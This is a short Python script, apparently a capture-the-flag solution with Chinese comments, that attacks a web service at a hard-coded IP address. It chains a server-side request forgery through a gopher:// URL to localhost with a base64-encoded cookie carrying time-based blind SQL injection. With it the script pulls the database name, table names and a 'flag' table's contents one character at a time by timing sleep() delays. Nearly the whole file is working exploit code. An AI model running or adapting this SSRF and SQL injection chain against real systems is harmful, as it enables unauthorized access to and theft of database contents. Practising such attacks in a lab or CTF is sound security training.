import urllib.parse
import requests
import time
import base64
url="http://61.147.171.105:51098//use.php?url="
flag=""
for pos in range(1,50):
    for i in range(33,127):
        # cookie注入测试
        poc="') union select 1,2,if(1=1,sleep(5),1) # "
        # 保险起见, 查看数据库中的字符是否在ascii的33-127范围内
        poc="') union select 1,2,if(ascii(substr((database())," + str(pos) + ",1))=" + str(i) + ",sleep(2),1)#"
        # 爆库名
        poc="') union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(pos) + ",1))" + str(i) + ",sleep(2),1#"
        # 获取flag
        poc="') union select 1,2,if(ascii(substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
        final_poc="gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D"+bs+"%3B%250d%250a"
        
        t1=time.time()
        res=requests.get(url+final_poc)
        t2=time.time()
        if(t2-t1>2):
            flag+=chr(i)
            break
print(flag)